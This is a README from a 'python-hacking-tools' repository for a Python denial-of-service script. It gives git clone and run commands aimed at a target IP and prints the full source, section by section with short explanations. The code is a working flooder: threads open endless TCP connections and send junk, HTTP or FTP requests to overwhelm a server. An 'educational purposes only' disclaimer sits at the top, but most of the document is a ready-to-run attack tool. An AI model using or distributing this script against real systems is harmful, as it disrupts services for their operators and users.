# Denial-of-Service with Python

This Python Script floods a target server with requests, attempting to overload and disrupt it.

It's a rather weak attack and its purpose is to show you how a DoS-attack works.

**FOR EDUCATIONAL PURPOSES ONLY! 
NEVER USE THIS SCRIPT IF YOU DO NOT FULLY UNDERSTAND IT! 
DO NOT ATTEMPT TO VIOLATE LOCAL LAW OR INFLICT ANY DAMAGE!
THE MISUSE OF  THIS SOFTWARE CAN RESULT IN SEVERE CONSEQUENCES! 
I ASSUME NO LIABILITY AND I AM NOT RESPONSIBLE FOR ANY DAMAGE CAUSED!**

## Usage

**If you want to use all tools or already cloned the whole repository:**

```
git clone https://github.com/lucasvictorbraun/python-hacking-tools

cd python-hacking-tools/DoS

python3 DoS.py [IP Adress] 80 4
```

**If you only want to use this tool, you have to perform a sparse checkout:**

```
mkdir python-hacking-tools && cd python-hacking-tools #choose any name for the directory

git init

git remote add -f origin https://github.com/lucasvictorbraun/python-hacking-tools

git config core.sparseCheckout true

echo "DoS/" >> .git/info/sparse-checkout

git pull origin main

cd DoS

python3 DoS.py [IP Adress] 80 4
```

## Code

```python
import sys

import socket as s

from threading import Thread
```

Imports sys, socket and threading.

```python
def do_dos():
    while True:
        soc = s.socket(s.AF_INET, s.SOCK_STREAM)
        try:
            soc.connect((ip, port))
```

Makes do_dos runs while True = until we terminate it.

Defines socket and connects to server.

```python
            if port == 80:
                soc.send(b'GET never_gonna_give_you_up.html HTTP/1.1')
            elif port == 21:
                soc.send(b'USER rick_astley')
            else:
                soc.send(b'NEVER GONNA LET YOU DOWN')
            print ("FLOODING...", end="\r")
        except:
            print ("SERVER DOWN", end="\r")
        soc.close()
```

Sends an HTTP GET request if port = 80.

Sends an FTP login command if port =21.

Sends nonsense text to other ports.

Prints SERVER DOWN when requests fail.

Notice: b'...' interprets texts as byte-array, because strings are not allowed.

```python
if len(sys.argv) != 4:
    print ("USAGE: ")
    print ("./" + sys.argv[0] + " [IP] [PORT] [THREADS] \n")
    sys.exit 

ip = sys.argv[1]
port = int(sys.argv[2])
threads = int(sys.argv[3])
```

Checks for arguments  and assigns them to the variables.

```python
print ("RUNNING ATTACK")
for i in range(0, threads):
    t = Thread(target=do_dos)
    t.start()
```

Prints RUNNING ATTACK.
Starts threads to run several executions.

## License
Licensed under the [MIT License](https://opensource.org/licenses/MIT).
